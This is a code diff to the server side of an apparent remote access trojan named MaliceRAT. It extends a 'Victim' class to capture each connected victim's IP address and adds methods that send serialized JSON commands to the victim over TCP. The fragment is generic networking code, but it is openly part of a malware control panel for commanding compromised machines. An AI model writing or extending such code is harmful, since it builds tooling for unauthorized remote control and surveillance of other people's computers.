@@ -1,4 +1,7 @@
 ﻿using System.Net.Sockets;
+using System.Web.Script.Serialization;
+using System.Text;
+using System.Threading.Tasks;
 
 namespace MaliceRAT.RatServer
 {
@@ -14,11 +17,27 @@ namespace MaliceRAT.RatServer
         public Victim(TcpClient client, int id)
         {
             TcpClient = client;
-            IP = "N/A";
+            IP = client.Client.RemoteEndPoint.ToString().Split(':')[0];
+            
             OS = "N/A";
             Id = id;
             PC = "N/A";
             User = "N/A";
+        }
+
+        public void Send(dynamic json)
+        {
+            JavaScriptSerializer serializer = new JavaScriptSerializer();
+            string jsonString = serializer.Serialize(json);
+            TcpClient.Client.Send(Encoding.ASCII.GetBytes(jsonString));
+        }
+        
+        public async Task SendAsync(dynamic json)
+        {
+            JavaScriptSerializer serializer = new JavaScriptSerializer();
+            string jsonString = serializer.Serialize(json);
+            byte[] data = Encoding.ASCII.GetBytes(jsonString);
+            await TcpClient.GetStream().WriteAsync(data, 0, data.Length);
         }
 
         public void Disconnect()
